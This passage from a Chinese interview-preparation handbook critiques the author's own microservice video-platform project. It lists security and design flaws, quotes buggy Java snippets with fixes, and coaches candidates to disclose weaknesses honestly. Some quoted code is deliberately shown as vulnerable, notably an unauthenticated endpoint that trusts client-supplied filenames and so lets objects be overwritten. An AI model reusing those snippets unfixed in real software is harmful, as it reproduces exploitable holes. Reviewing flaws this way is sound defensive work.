1. **安全是最大短板**：网关鉴权恒真、WebSocket 身份前端可控、业务层信任前端 `userId`、`/search/test` 与 `deleteIndex` 无鉴权暴露、密钥硬编码、验证码答案返回前端、Swagger 生产未关。（→ 详见第 22 章）
2. **状态全放在进程内存里**：AI 上下文（`BIGMODEL_MAP`）、WebSocket 映射表、上传分片状态（`uploadPartMap`）、ES 全量同步标志（`static Boolean`）——**这四处直接导致服务无法水平扩容**。
3. **数据库设计缺失**：**21 张业务表零二级索引、零唯一约束、零外键**，所有非主键查询全表扫，触发器也让写操作全表扫，且数据库层无法兜底幂等。
4. **异步链路的可靠性不足**：MQ 消费端吞异常不重试、生产端失败静默丢消息、Redis List 的 `range`+`delete` 非原子、无死信监控、无告警。
5. **依赖栈「写了但没跑起来」**：**Nacos 依赖从未引入**（服务没注册）、`discovery.locator` 空转、Feign 全部写死 `url` 绕过服务发现、`mysqlToEs` 任务没有 cron 定义、Sleuth 采样率配置层级写错。
6. **可观测性不完整**：只有链路（还断在 MQ 和 OkHttp 线程），**完全没有指标**（无 Micrometer/Prometheus）。

> **⚠️ 关键提醒**：这六条里，**第 1、2、3、5 条有「被面试官当场查出来」的风险**（他能看代码/查依赖）。**主动讲是加分，被问出来是减分。** 建议在自我介绍或「你有什么不足」的环节**主动抛出第 3 条和第 5 条**（数据库无索引、Nacos 依赖缺失）——这两条最容易被验证，也最能体现你的自省是真诚的而不是套路。

### 23.4 面试中千万不要说的三句话

| 不要说的话 | 为什么 | 改成什么 |
|---|---|---|
| 「我用 Nacos 做了服务注册与发现」 | **依赖都没引入，服务根本没注册** | 「Nacos 我配置了但依赖没引全，实际没跑起来，我知道修法是三件套……」 |
| 「我做了关键字高亮」 | **ES 高亮代码只 import 未使用，实际是前端正则** | 「高亮目前在前端用正则做，ES 侧没实现，我知道该用 `HighlightBuilder` 并注意 XSS」 |
| 「JAVE 做了转码、压缩、去水印」 | **压缩参数没配、去水印代码不存在** | 「实现了转码、截帧、时长提取；压缩属于参数没配全；去水印我调研了但因为合规风险没做」 |

**通用原则**：**凡是简历/README 写了但代码里没有的，被问到时都要主动「降级表述 + 补上正确做法」。** 面试官不是在找完美的项目，是在找**知道自己项目边界、并且能说清怎么改进**的人。

---

## 附录 A 高频追问链（面试官会顺着往深里问）

| 起点问题 | 追问 1 | 追问 2 | 追问 3（深水区） |
|---|---|---|---|
| 「讲讲 Nacos」 | 注册流程？ | AP 还是 CP？ | **你项目里真注册上去了吗？** |
| 「讲讲 Feign」 | 原理？ | 超时怎么配？ | **传大文件会怎样？调用失败消息丢了怎么办？** |
| 「讲讲 Gateway」 | 三大概念？ | **怎么转发 WebSocket？** | 网关能限流吗？鉴权为什么放网关？ |
| 「讲讲 Redis」 | 用来做什么？ | key 怎么设计？ | **`encode-count` 那段代码有问题吗？** |
| 「讲讲 ES」 | 为什么不用 LIKE？ | 你的 query 怎么写的？ | **为什么没配 IK 分词？深分页怎么办？** |
| 「讲讲 RocketMQ」 | 几个 topic？ | 顺序消息怎么做？ | **你的 `ORDERLY` 生效了吗？消息重复怎么办？** |
| 「讲讲 MinIO 分片上传」 | 为什么分片？ | 怎么合并的？ | **和 S3 官方 Multipart 有什么区别？状态存哪？** |
| 「讲讲 MyBatis-Plus」 | 为什么不用 JPA？ | 自动填充怎么做的？ | **`@Transactional` 生效了吗？计数怎么更新的？** |
| 「讲讲 WebSocket」 | 为什么不用轮询/SSE？ | 怎么区分私聊和 AI？ | **身份怎么认证的？能水平扩容吗？** |
| 「讲讲大模型集成」 | 鉴权怎么做？ | 流式怎么实现？ | **`status=0` 丢了会怎样？上下文存哪？** |
| 「讲讲 XXL-Job」 | 为什么不用 `@Scheduled`？ | cron 是多少？ | **你仓库里有 cron 吗？`range`+`delete` 有问题吗？** |
| 「讲讲链路追踪」 | Sleuth 和 Zipkin 分工？ | traceId 怎么传？ | **MQ 那段 trace 是断的吗？采样率配对了吗？** |
| 「你的项目有什么不足？」 | 最该先修哪个？ | 为什么是这个顺序？ | **如果 QPS 涨 100 倍哪里先炸？** |

---

## 附录 B 面试前 30 分钟自查清单

### B1. 必须能背出来的数字与名称

- [ ] 6 个服务的**名字 + 端口**（gateway **8200** / user_center **3000** / video **10201** / notice **30000** / search **8201** / chat **1688**）
- [ ] **5 个 RocketMQ topic**（`video-encode`、`mysqlToEs`、`like`、`comment`、`dynamic`）
- [ ] **3 个 ES 索引**（`video`、`user`、`history_search`）
- [ ] **长短 token 有效期**（短 **30 分钟** / 长 **7 天**）+ 请求头名（`shortAuthorization` / `longAuthorization`）
- [ ] **WebSocket 端点**（`/ljl/bilibili/chat`）+ **4 种消息 type**（`init` / `message` / `bigmodel` / `removeSession`）
- [ ] **`status` 0/1/2 含义**（首帧 / 中间帧 / 末帧）
- [ ] **星火三套 API**（`v3.5/chat` WebSocket、`v2.1/tti` 文生图、AIPPT `createOutline`）
- [ ] **Redis 5 个同步队列 key**（`add:video`、`delete:video`、`update:video`、`add:user`、`update:user`）
- [ ] **MinIO bucket**（`video`、`video-cover`、`user-cover`）
- [ ] **前端分片大小**（**6MB**）
- [ ] **XXL-Job 执行器端口**（9916）/ 任务 handler 名（`mysqlToEs`）
- [ ] **Druid 默认 `maxActive`**（**8**）

### B2. 必须能画出/说清的三条链路

- [ ] **投稿链路**：分片上传 → MinIO → `composeObject` 合并 → Feign notice → MQ `video-encode` → jave 截帧/转码 → 回传 → MQ `mysqlToEs` → Redis List → xxl-job → ES
- [ ] **点赞链路**：video 落库（触发器加计数）→ Feign notice → MQ `like` → ORDERLY 消费 → `like_notice` → 未读数统计（6 条 SQL）
- [ ] **私聊 / AIGC 链路**：浏览器 → gateway(`ws://`) → chat → 两张映射表 → 在线直推 / 离线落库；AIGC 走 OkHttp → 星火 → 增量帧透传

### B3. 必须能主动交代的 5 件事（**本文档最大的价值**）

- [ ] **Nacos 依赖没引入，服务实际没注册**（第 3.1.1 节）
- [ ] **数据库 21 张表零索引、零唯一约束、零外键**（第 12.4 节）
- [ ] **网关鉴权恒真 + WebSocket 身份前端可控**（第 2 章 Q4、第 17 章 Q3）
- [ ] **`/search/test` 和 `deleteIndex` 无鉴权暴露**（第 22 章 S1/S2）
- [ ] **简历上的「压缩 / 去水印」实际不存在**（第 19 章开头澄清）

### B4. 必须能说出「怎么改」的 5 个重构

- [ ] 上传状态 → **Redis Hash**（多实例 + 重启恢复 + TTL）
- [ ] AI 上下文 → **Redis List + LTRIM + TTL**
- [ ] MQ 可靠性 → 消费端**抛异常重试** + **唯一索引幂等** + 本地消息表
- [ ] ES 同步 → **Lua 原子取空 / `RPOPLPUSH`**，全量改 **bulk + 分片广播**
- [ ] 鉴权 → 网关解析 JWT 下传 `X-User-Id` + WebSocket **握手鉴权** + **补 `/login/**` 白名单**

---

## 附录 C 本项目「技术栈真实度」自查结论

**这一节是给你自己看的，不是给面试官看的。** 我逐个技术栈核对了「是否真的在用」，结论如下——**它直接决定你面试时哪些能说、哪些要降级表述**：

| 技术栈 | 真实度 | 结论 |
|---|---|---|
| SpringBoot | ✅ **真用** | 6 服务运行底座 + 父 POM 统一版本 |
| Security | ✅ **真用（配置有致命缺陷）** | 过滤器链生效，但鉴权恒真 |
| **Nacos** | ❌ **只有配置，依赖未引入，功能不存在** | **必须降级表述** |
| OpenFeign | ✅ **真用** | 3 个 Client、9 个方法、链路完整 |
| Gateway | ✅ **真用** | 6 条路由 + WebSocket 路由 |
| Redis | ✅ **真用** | 4 类用途（但**都不是「缓存」**） |
| Elasticsearch | ✅ **真用（无分词、无 mapping）** | 3 索引、`multi_match`、`moreLikeThis` |
| RocketMQ | ✅ **真用** | 5 topic、5 消费者 |
| MinIO | ✅ **真用** | 分片 + 合并 + 截帧上传 |
| MyBatis-Plus | ✅ **真用（深度使用）** | 20 实体 + 自动填充 |
| MyBatis-Plus-Join | ✅ **真用（3 处）** | 用法正确但覆盖面小 |
| Druid | ⚠️ **只用了默认值** | 无参数、无监控 |
| JWT | ✅ **真用（刷新逻辑坏）** | 签发 / 解析 / 校验都有 |
| Swagger（Knife4j） | ✅ **真用（注解很全）** | 各模块 Docket + 250+ 注解 |
| Gson | ✅ **真用** | chat 的 WebSocket 链路 |
| Hutool | ⚠️ **真用但只用 3 个类** | IO / Base64 / 文件类型 |
| WebSocket | ✅ **真用（深度）** | 私聊 + AIGC 双业务 |
| 讯飞星火 | ✅ **真用（三套 API 全通）** | 文生文 / 文生图 / AIPPT |
| **JAVE** | ⚠️ **真用，但只做了 3 件事** | 截帧 / 时长 / 转码；**压缩与去水印不存在** |
| XXL-Job | ⚠️ **真用，但任务定义不在仓库** | handler 有、cron 靠人工建 |
| Sleuth | ⚠️ **真用但采样率配错** | 依赖在，配置层级错 |
| Zipkin | ✅ **真用（内存存储）** | 接收 span + UI |
| （附）MySQL 触发器 | ✅ **真用，且是计数更新的唯一实现** | 7 个触发器 |

**结论**：**22 项技术栈里，17 项是真用的；3 项（Nacos / Druid / Swagger 生产开关）存在「引入但未充分发挥」的问题；2 项（JAVE 的功能范围、XXL-Job 的任务定义）存在「表述与实际不符」的问题。**

> **面试策略收尾**：**Nacos 是唯一一条「绝对不能硬说」的**（一查依赖树就穿）。其他项都可以正常讲，但要在被追问到边界时主动收窄表述。**把「我知道我的边界在哪」讲出来，比假装全都完美更有说服力。**
>
> **最后一句**：面试官不会因为你项目有 bug 而淘汰你——**他淘汰的是「不知道自己项目有 bug」的人**。这份文档里所有的「缺陷清单」，都是你展示工程判断力的素材。**把它们讲成「我发现了什么、为什么它重要、我打算怎么改」，这个项目就从「跟着教程做的 CRUD 项目」变成了「你真正理解过的系统」。**

---

## 附录 D 「读代码」专项：业务模块细节 bug 清单

**这一节是为「面试官拿着你的代码逐行看」准备的。** 前面各章按技术栈组织，这里按**业务模块**补齐更细的缺陷——它们单看都很小，但**面试官随手翻到一个问你怎么回事**，答不出来就很伤。**建议至少精读 D1～D4 这四组，它们是必现的、有明确业务后果的。**

### D1. 评论模块（`CommentServiceImpl`）

**① 🔴 评论一个不存在的视频 → NPE（接口 500）**

```java
// CommentServiceImpl.java:51-57
commentMapper.insert(comment);                          // 先插评论
LambdaQueryWrapper<Video> wrapper = new LambdaQueryWrapper<>();
wrapper.eq(Video::getId, comment.getVideoId());
if (!videoMapper.selectOne(wrapper).getUserId()...      // ← selectOne 返回 null 时直接 .getUserId() → NPE
```
- **触发条件**：传一个不存在的 `videoId`。**因为代码是先 `insert` 再查视频**，所以 NPE 发生时**评论已经落库了**，留下一条指向不存在视频的孤儿评论。
- **修法**：先查视频判空（`Video v = videoMapper.selectById(videoId); if (v == null) return Result.error("视频不存在");`），再插入；并且整个方法加 `@Transactional`。

**② 🔴 二级以上的回复被静默丢弃（评论楼层丢失）**

```java
// CommentServiceImpl.java:102-115
Map<Integer, CommentResponse> responseMap = new HashMap<>();
for (CommentDetailResponse response : commentToVideoResponses) {
    if (response.getTopId() == null) {
        responseMap.put(response.getId(), commentResponse);                 // 只把「顶层评论」放进 map
    } else {
        CommentResponse commentResponse =
                responseMap.getOrDefault(response.getTopId(), new CommentResponse());  // ← 取不到就给个临时对象
        commentResponse.getCommentDetailResponses().add(response);           // ← 加到临时对象上，然后丢弃！
    }
}
```
- **问题**：`getOrDefault` 在 key 不存在时**返回一个新的临时对象**，`add` 到它上面之后**这个对象没有被放回 map**，于是这条回复**从结果里消失了**。
- **触发条件**：任何 `top_id` 不指向「顶层评论」的回复，也就是**回复的回复（第二层以上）**。用户会看到「我明明回复了，但页面上没有」。
- **修法**：显式判空并挂到正确的父节点，或者干脆**改成前端展开式（扁平列表 + `parentId` 层级）而不是后端组装树**：
  ```java
  CommentResponse parent = responseMap.get(response.getTopId());
  if (parent == null) { responseMap.put(response.getTopId(), parent = new CommentResponse()); }
  parent.getCommentDetailResponses().add(response);
  ```

**③ 一次请求 5+ 次 SQL**：`getComment` 里手写 join（4 表自连接）+ `in()` 查点赞 + 分组计数 + `selectOne` 取总数，**没有缓存**（评论和弹幕都是高频读接口）。

### D2. 弹幕模块（`DanmakuServiceImpl`）

**④ 弹幕计数「看起来没人更新」，但真相是触发器在维护**

- `DanmakuServiceImpl` 只有 `addDanmaku`（单条 `insert`）和 `getDanmaku`（`eq(videoId)` 的**全量 `selectList`，无分页**）两个方法，**Java 代码里确实没有任何地方更新 `danmaku_count`**（`grep setDanmakuCount` 全项目无结果）。
- **⚠️ 面试时千万不要答成「所以详情页弹幕数是 0」**——那就错了。这个计数**是被 MySQL 触发器维护的**（`docker/mysql/init/02-triggers.sql:34-38` 的 `increment_danmaku_count`），所以详情页弹幕数**是对的**，只是**更新逻辑不在 Java 里**（完整讨论见第 11 章 Q8）。
- **这条的正确讲法**：「计数不是 Java 维护的，是 **MySQL 触发器**维护的——一共 7 个触发器覆盖 play/comment/likes/collect/danmaku 的增删。这样做的优点是**和应用层解耦、天然和插入同事务**；缺点是**写放大和热点行锁**，而且**读代码时完全看不到计数从哪来**（我这次就是复盘时才发现）。」
- **真正的问题是另外两个**：
  1. **弹幕没有删除功能**：`vo/request/danmaku/ReCallDanmakuRequest.java`（"撤回弹幕"）**是个死类，没有任何实现使用它**。而触发器只处理 `INSERT`、**没有 `AFTER DELETE` 触发器**，所以即使将来加了撤回，`danmaku_count` 也会**只增不减**。
  2. **`getDanmaku` 是 `eq(videoId)` 的全量查询**，没有分页、没有缓存。热门视频几万条弹幕会**一次性全查出来**。正确做法是**按播放时间窗口分片拉取 + Redis 缓存**（前端只请求「当前播放位置 ±30 秒」的弹幕）。

### D3. 点赞模块（`LikeServiceImpl`）

**⑤ 死代码 + 字段写错 —— 「看起来在工作、其实什么都没做」**

```java
// LikeServiceImpl.java:31-42
public Result<Boolean> like(LikeRequest likeRequest) {
    likeMapper.insert(likeRequest.toEntity());
    LambdaQueryWrapper<Video> wrapper = new LambdaQueryWrapper<>();
    wrapper.eq(Video::getId, likeRequest.getVideoId());            // ← 建了 wrapper，从头到尾没用
    CompletableFuture<Void> f = CompletableFuture.runAsync(() -> {
        LambdaQueryWrapper<VideoData> videoDataLambdaQueryWrapper = new LambdaQueryWrapper<>();
        videoDataLambdaQueryWrapper.eq(VideoData::getId, likeRequest.getVideoId());   // ← 字段写错：应为 getVideoId
        client.sendLikeNotice(likeRequest.toAddOrDeleteNotice().setType(0));          // ← wrapper 依然没用上
    });
    return Result.success(true);
}
```
- **三处问题**：① 第 33-34 行的 `wrapper` **构造后完全未使用**（死代码）；② 第 37 行 `VideoData::getId` **字段写错了**（应该是 `getVideoId`）——`video_data.id` 和 `video_data.video_id` 是两个不同的列；③ 整个 `videoDataLambdaQueryWrapper` **构造完也没被任何查询使用**。
- **这是「重构到一半」的产物**：本意应该是「点赞后更新 `video_data.like_count`」，后来改用 MySQL 触发器实现，**但这段残骸没删**。所以它现在既不会报错也不起作用。
- **面试话术**：「这段是我要主动指出的——它构造了两个 `LambdaQueryWrapper` 但都没使用，其中一个字段还写错了。原意是更新点赞计数，后来我改成用 MySQL 触发器实现，**但残骸没清理**。**这类『死代码』比会报错的 bug 更危险，因为它是静默的**。这也说明重构后必须回头删旧代码。」

**⑥ `selectOne` 在重复数据下会抛异常（与「无唯一约束」耦合）**

```java
// PlayServiceImpl.java:101-105
likeLambdaQueryWrapper.eq(Like::getVideoId, videoId);
likeLambdaQueryWrapper.eq(Like::getUserId, userId);
Like videoLike = likeMapper.selectOne(likeLambdaQueryWrapper);   // 查不到返回 null（已处理）；查到多条 → TooManyResultsException
```
- **风险链**：`likes` 表**没有唯一约束**（见第 12.4 节），而 `LikeServiceImpl.like()` **不检查是否已点赞就直接 insert** → 同一用户对同一视频可能有多行 → `selectOne` 抛 **`TooManyResultsException`** → **视频详情页直接 500**。
- **这三个缺陷是耦合的**：应用层不做幂等 + 数据库无唯一约束 + 用 `selectOne` 读 → **三者叠加才会炸**。修任何一个都能缓解，**但正确做法是三个一起修**（加唯一索引 + 代码判重 + 改用 `exists`/`selectList` 取首条）。

### D4. 收藏 / 播放模块

**⑦ 循环内逐条写库，且完全没有事务**

```java
// CollectServiceImpl.java:44-60
public Result<Boolean> collect(List<CollectRequest> collects) {      // ← 无 @Transactional
    for (CollectRequest collectRequest : collects) {
        if (collectRequest.getType()) { collectMapper.insert(collect); }
        else { collectMapper.delete(wrapper); }
    }
    return Result.success(true);
}
```
- **问题**：① **一次收藏多个视频不做批量**（N 次网络往返 + N 个独立自动提交事务）；② **没有 `@Transactional`**——中途失败会留下**「收藏了一半」的中间状态**，而接口只返回成功/失败二选一，前端无法知道真实状态；③ 无幂等（重复收藏产生重复行）。
- **修法**：加 `@Transactional(rollbackFor = Exception.class)`，用 `saveBatch`/`insertBatchSomeColumn` 批量，加唯一索引 `(collect_group_id, video_id)` 兜底。

**⑧ 删除收藏夹不级联删收藏记录 → 孤儿数据**

```java
// CollectServiceImpl.java:115-116
public Result<Boolean> deleteCollectGroup(CollectGroupRequest req) {
    collectGroupMapper.deleteById(req.toEntity());     // ← 只删了收藏夹，collect 表里的记录还在
```
- **后果**：`collect` 表留下指向已删除收藏夹的记录。因为没有外键约束阻止（第 12.4 节），视频详情页的「是否已收藏」查询（`collectGroupId IN (...)`）会把它们算进去但不显示 → **用户看到「已收藏」却找不到收藏夹**。
- **另外 `deleteById` 传的是实体而不是 id**（`req.toEntity()`）——MyBatis-Plus 接受实体时会按主键删除，所以能工作，但**语义误导**（应该传 `req.getId()`）。

**⑨ 先查后插非原子 → 并发下重复插入，并连带把计数打错**

```java
// PlayServiceImpl.java:60-71
if (playMapper.selectList(wrapper).size() > 0) {       // ← 先查
    return Result.success(HAS_PLAY);
} else {
    playMapper.insert(new Play().setVideoId(videoId).setUserId(userId));   // ← 后插，中间无锁
}
```
- **问题**：典型 **check-then-act 竞态**。用户快速刷新/双击就会**插入多条播放记录**，进而**触发器把 `play_count` 多加几次**——**基于触发器的计数方案在这里暴露了它的脆弱性：它无法区分「真实播放」和「重复插入」**。
- **修法**：加唯一索引 `(user_id, video_id)` 让数据库兜底，代码捕获 `DuplicateKeyException` 当作「已存在」处理（**不要抛异常**）。
- **顺带**：`Result.success(HAS_PLAY)` 命中的是 `success(String msg)` 重载，**提示被放进了 `msg` 而不是 `data`**，前端读 `data` 会拿到 null。属于返回值语义错位。

**⑩ `RedisTemplate` 注入后从未使用**

```java
// PlayServiceImpl.java:52-53
@Resource RedisTemplate objectRedisTemplate;     // ← 注入后全类没有任何调用
```
- 说明**本来打算给首页视频/详情页加缓存**（`video/constant/Constant.java:28` 那个 `Map<Integer, List<FirstPageVideoResponse>>` 也是同样意图的残留，同样没被使用），**但没做完**。video 模块的 Redis 实际只剩下 `encode-count` 那一个用途。
- **这正好准确回答「你项目的 Redis 用在哪」**——**在 video 模块几乎没用**，主要用途在 gateway（验证码）和 notice→search（ES 增量同步队列）。

### D5. 上传模块的漏网细节（补充第 10 章）

**⑪ 🔴 抽帧用的是「第一个到达的分片」，不是「第 1 个分片」**

```java
// UploadAndEditServiceImpl.java:297-310
if (uploadPartMap.get(resumableIdentifier) == null || !...getHasCutImg()) {   // 谁先到谁触发
    Files.copy(byteArrayInputStream, Paths.get(videoFile.getAbsolutePath()), REPLACE_EXISTING);
    screenExtractor.renderOneImage(new MultimediaObject(videoFile), -1, -1, 1000, coverFile, 1);
}
```
- **问题**：前端 `simultaneousUploads: 4` **并发上传**，**第一个到达的可能是第 3 片**，而这个分支会把这一片当成「完整视频」喂给 `ScreenExtractor`。它能工作是因为 `moov atom`（元数据）通常在文件开头且第 1 片已含该位置；**但如果第一个到达的不是第 1 片、而它不含 moov，抽帧就会失败**。另外**非 faststart 的 mp4（moov 在文件末尾）必然抽帧失败**。
- **修法**：**把截帧移到「合并完成之后」**（那时是完整文件，moov 一定可读），并用 `thumbnail` 滤镜自动挑选代表性帧。

**⑫ 🟠 分片对象名不幂等 → 重传产生垃圾对象**

```java
String name = resumableIdentifier + UUID.randomUUID().toString().substring(0, 10);   // ← 每次重传都是新名字
newUploadPartMap.put(chunkNumber, name);      // ← map 被覆盖，旧对象名丢失
```
- **后果**：网络抖动导致前端重传同一分片时，**MinIO 里产生一个新对象，而 map 指向新对象、旧对象再也没人知道**（永不被删、永不被引用）。叠加「合并后不删分片」（第 10 章），**垃圾对象量级 = 垃圾分片 × 重复次数**。
- **修法**：对象名改成**确定性**的（`identifier + chunkNumber`，重传即覆盖，天然幂等），**同时还能让 `composePart` 不再依赖内存 map 里的对象名**。

**⑬ 🟡 字符串用 `!= ""` 比较，以及一处死代码**

```java
// UploadAndEditServiceImpl.java:101
if (coverFile != null && coverFile != "") {          // ← 字符串比较用了 != （比较引用），应为 !coverFile.isEmpty()
// :117
queryWrapper.eq(Video::getCover, UUID.randomUUID().toString().substring(0,8) + coverFileName);   // ← 拼了个随机值，永远匹配不到
```
- `:101` 这个判断**碰巧能工作**（前端传空串时反序列化出的对象通常不是同一个引用），但**依赖实现细节**，属于隐患。
- `:117` 那个 `queryWrapper` **最终没有被使用**（后面直接 `minioService.uploadImgFile(...)`），所以是**死代码**；但如果当时真用了，就是一个「拿随机值当查询条件」的必错 bug。

**⑭ 🟠 `edit` 无事务 + 异步块并发改同一个 `HashMap`**

```java
// UploadAndEditServiceImpl.java:164-228
public Result<Boolean> edit(EditVideoRequest req) {            // ← 无 @Transactional
    Map<String, Object> map = req.toMap();
    if (videoFile != null) { ... map.put(VIDEO_URL, videoUrl); ... }                      // 主线程改 map
    if (coverFile != null) {
        CompletableFuture.runAsync(() -> { ... map.put(VIDEO_COVER, coverUrl); ... });     // ← 异步线程也在改同一个 map
    }
    CompletableFuture.runAsync(() -> client.sendDBChangeNotice(map));                      // ← 第三个线程同时读这个 map
    videoMapper.updateById(video);                                                         // ← 先落库，异步上传可能失败
}
```
- **三个问题**：① **`HashMap` 被多线程并发读写**（主线程 `put`、异步线程 `put` 和 `read`）→ **可能丢更新**，而且**发到 MQ 的 `map` 内容是不确定的**；② **没有 `@Transactional`**，`updateById` 先执行，异步上传失败时 **DB 里已经存了指向不存在对象的 URL**；③ **`CompletableFuture` 的异常全被丢弃**（没有 `join()` 也没有 `exceptionally`），上传失败**静默**。
- **修法**：`map` 改 `ConcurrentHashMap` 或改用局部变量拼装后统一 put；**先完成上传拿到 URL，再落库和发消息**；用 `CompletableFuture.allOf(...).join()` 汇聚并处理异常。

### D6. 接口层细节

**⑮ 🟡 `@PostMapping("edit")` 少了一个 `/`**

```java
// UploadAndEditController.java:26,46
@RequestMapping("/createCenter")
@PostMapping("edit")            // ← 缺前导斜杠（其他是 "/uploadTotal"、"/uploadPart"、"/delete"）
```
- Spring 会把 `"edit"` **相对 `"/createCenter"` 解析**，最终路径仍是 `/createCenter/edit`，**功能正常**。但这是**不一致的写法**（5 个映射里 4 个有斜杠），属于「提交前没统一格式」的痕迹。**面试官看到会认为你对代码整洁度不敏感。**

**⑯ 🔴 内部接口把「客户端文件名」直接当对象名 —— 可覆盖任意对象**

```java
// VideoEncodeController.java:38-39
public void uploadVideo(@RequestPart("multipartFile") MultipartFile multipartFile) {
    minioService.uploadVideoFile(multipartFile.getOriginalFilename(), multipartFile.getInputStream(), VIDEO_TYPE);
}
```
- **问题**：`getOriginalFilename()` **由客户端完全控制**。攻击者可以传成**任意视频已有的对象名**，从而**覆盖别人的视频文件**（MinIO 的 object key 是扁平的，`../` 会被规范化，但**同名覆盖是直接成立的**）。
- **而且这个接口没有鉴权**：`@ApiIgnore` **只是不在 Swagger 文档里显示，不提供任何访问控制**。目前网关 `route3` 覆盖 `/createCenter/**`，**`/videoEncode/**` 没有任何路由**（只能内网直连 10201）——**这算侥幸的安全，但不能依赖「没配路由」当防护**（容器化后服务间是同一网络，任何服务都能直连）。
- **修法**：对象名**必须由服务端生成**（UUID + 扩展名白名单），绝不用客户端传的文件名；接口加内部调用鉴权（内部 token）。

**⑰ 🟡 contentType 常量拼写错误**

```java
// video/constant/Constant.java:16
public static final String IMAGE_TYPE = "images/jpeg";     // ← 合法 MIME 是 "image/jpeg"（image 是单数）
```
- `"images/jpeg"` **不是合法的 MIME 类型**。`VideoEncodeController:45` 用它上传封面，浏览器拿到这个 Content-Type 时**可能不按图片渲染**，而且违反规范。属于「打错一个字母但会影响功能」的小 bug。

### D7. 这一节的面试用法

**怎么把这些「小 bug」变成加分项？** 关键不是背下来，而是**展示一套读代码的方法**：

> 「我复盘时养成了一个习惯：**对每段代码问三个问题**——
> ① **这段代码真的被执行到了吗？**（很多是重构残骸，比如 `LikeServiceImpl` 里那两个构造后没用的 wrapper）
> ② **它的失败路径是什么？**（比如 `selectOne` 返回 null 会不会 NPE、并发下会不会重复插、并发改同一个 `HashMap` 会怎样）
> ③ **它的数据从哪来、到哪去？**（比如 `getOriginalFilename()` 是客户端控制的、`getOrDefault` 的默认值会被丢弃）
>
> **这三个问题能扫出上面 90% 的问题。**
>
> 举个我自己的例子：`CommentServiceImpl` 里那段组装评论树的代码我一开始以为是对的，直到注意到 `responseMap.getOrDefault(topId, new CommentResponse())` —— **`getOrDefault` 的默认值是个临时对象，`add` 进去之后没有放回 map，所以第二层以上的回复会静默消失**。这个 bug 的可怕之处在于**不报错、不为空、只是少了数据**，靠功能测试很难发现，必须靠读代码。」

**这段话的价值**：它证明的不是「你项目没 bug」（不现实），而是「**你有能力发现 bug**」——**这才是技术面真正在评估的东西。**

---

## 结语

这份手册写了 23 章正文 + 4 个附录，核心逻辑只有一条：

> **面试不是「证明我的项目没有缺点」，而是「证明我理解我的项目」。**

一个能主动说出「这里少了唯一索引」「这里 Nacos 依赖根本没引」「这里 `@Transactional` 因为吞异常而失效」的候选人，和一个只会背「SpringBoot 自动配置原理」的候选人，**差距不在知识量，在有没有真的为自己的代码负过责**。

**最后三个建议：**

1. **先读第 22 章（安全缺陷专项）和附录 C（技术栈真实度自查）**——这两节决定你哪些话能说、哪些必须降级表述。别的章节答不好是扣分，**这两节答不好是诚信问题**。
2. **把「主动暴露 + 给出修法」练成肌肉记忆。** 遇到任何被指出的问题，标准句式是三句话：**「这个问题我知道，根因是 X；它现在的业务后果是 Y；我打算按 Z 的顺序修。」** 从防守变进攻。
3. **技术栈的广度是你的优势，但每个都不深就是劣势。** 22 个技术栈里，**挑 5 个讲到「能画出图、能说出参数、能讲清取舍」的深度**——建议：① MinIO 分片上传与合并；② RocketMQ + Redis + XXL-Job 的 MySQL→ES 数据同步；③ WebSocket + 星火流式对话；④ JWT + 网关鉴权；⑤ ES 搜索与推荐。其余能说清「定位 + 局限」即可。**面试官只会深挖你讲得最熟的那两个，而那正是你要引导他去的地方。**



